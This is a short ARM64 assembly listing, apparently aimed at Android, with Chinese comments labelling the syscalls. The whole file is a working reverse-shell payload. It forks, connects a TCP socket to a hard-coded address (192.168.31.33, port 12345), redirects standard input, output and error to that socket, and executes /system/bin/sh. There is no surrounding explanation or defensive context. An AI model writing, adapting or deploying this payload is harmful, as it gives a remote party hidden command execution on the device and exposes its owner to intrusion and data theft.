.section .text
.global _start
_start:
  mov x0,#17
  mov x1,#0
  mov x2,#0
  mov x3,#0
  mov x4,#0
  mov x8,#220
  svc #0
  cmp x0,#0
   
  bne .L2

cbshell:
  mov x0,#2
  mov x1,#1
  mov x2,#6
  mov x8,#198
  svc #0  // socket 调用
  
  mov x4,x0

  adr x1,addr
  mov x2,#16
  mov x8,#203
  svc #0  // connect 调用
  
  mov x0,x4
  mov x1,#0
  mov x2,#0
  mov x8,#24
  svc #0

  mov x0,x4
  mov x1,#1
  mov x2,#0
  mov x8,#24
  svc #0

  mov x0,x4
  mov x1,#2
  mov x2,#0
  mov x8,#24
  svc #0   // dup3 调用
  
  adr x0,systembinsh
  mov x1,#0
  mov x2,#0 
  mov x8, #0xdd                  	// #221
  svc #0x0
.L2:
  b     .L2 



addr:
  .short 2
  .ascii "\x30\x39"
  .byte 192,168,31,33
systembinsh:
  .asciz "/system/bin/sh" 
